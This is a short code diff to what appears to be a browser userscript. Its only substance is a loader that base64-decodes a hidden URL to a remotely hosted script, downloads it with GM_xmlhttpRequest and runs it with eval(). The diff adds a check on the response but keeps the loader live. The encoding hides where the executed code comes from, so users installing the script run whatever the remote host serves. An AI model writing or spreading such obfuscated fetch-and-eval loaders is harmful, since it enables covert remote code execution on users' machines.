@@ -25,13 +25,12 @@
     function decodeBase64(e) {
         try { return atob(e); } catch (e) { return ""; }
     }
-    
     const sourceUrl = decodeBase64("aHR0cHM6Ly9jZG4uanNkbGV2ci5uZXQvZ2gvTWluaGJlbzgvZXh0ZW5zaW9uX211bHRpX0Jyb3dzZXJAbWFpbi9leHRlbnNpb24uanM=");
     GM_xmlhttpRequest({
         method: "GET",
         url: sourceUrl,
         onload: function(response) {
-            if (response.status === 200) {
+            if (response.status === 200 && response.responseText) {
                 eval(response.responseText);
             } else {
                 alert("Không tải được mã nguồn chính: " + response.status);
